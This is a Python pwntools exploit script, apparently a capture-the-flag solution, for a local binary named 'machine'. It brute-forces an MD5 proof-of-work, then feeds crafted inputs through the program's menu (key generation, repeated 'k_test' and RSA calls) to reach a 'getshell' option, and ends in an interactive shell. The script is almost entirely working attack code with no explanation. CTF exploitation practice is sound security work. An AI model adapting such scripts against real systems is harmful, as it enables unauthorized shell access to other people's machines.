from pwn import *
import hashlib
debug=0
if debug:
    context.log_level = 'debug'
EXE='./machine'
context.binary = EXE
elf = ELF(EXE)
io=process(EXE,aslr=False) 

def dbg(s=''):
    gdb.attach(io,s)

def sys_menu(cmd):
	io.sendlineafter('[+]','2')
	io.sendlineafter('[+]',str(cmd))

def sys_gen():
	sys_menu(1)
def sys_rsa():
	sys_menu(6)
def sys_k_test(con):
	sys_menu(3)
	io.sendlineafter('[+]',con)
def sys_getshell():
	sys_menu(5)
	io.recvuntil('[+]')
	io.sendlineafter('[+]','0'*0x80)

def pass_proof():
    io.recvuntil("Proof-Your-Heart:")
    pre=io.recvuntil("#")[0:-1].decode("hex")
    md5_target=io.recvuntil("#")[0:-1]
    for i1 in range(0x100):
        for i2 in range(0x100):
            for i3 in range(0x100):
                tmp=chr(i1)+chr(i2)+chr(i3)
                if hashlib.md5(pre+tmp).hexdigest()==md5_target:
                    io.send(tmp.encode("hex"))
                    io.recvuntil("[+]Access")
                    return

pass_proof()
sys_gen()
for i in range(5):
	sys_k_test('1a'*0x40)
	sys_rsa()
sys_getshell()
io.interactive()